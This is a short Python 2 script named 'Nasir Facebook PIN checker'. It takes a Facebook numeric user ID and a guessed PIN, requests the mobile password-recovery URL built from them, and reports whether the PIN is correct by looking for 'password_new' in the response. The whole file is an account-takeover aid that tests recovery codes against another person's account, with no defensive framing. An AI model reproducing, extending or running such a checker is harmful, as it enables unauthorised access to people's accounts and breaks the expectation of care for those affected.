import urllib2 ,sys ,re
import os
import ssl
import time
print("\nNasir Facebook PIN checker")

print"\nNumericID:"
target = raw_input()
print"PinCode:"
w = raw_input()



target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
print(target)


get = urllib2.urlopen(target).read()
search = re.search('password_new', get)
if search:
                   print( "~>CORRECT" )
else:
                    print("~>INCORRECT")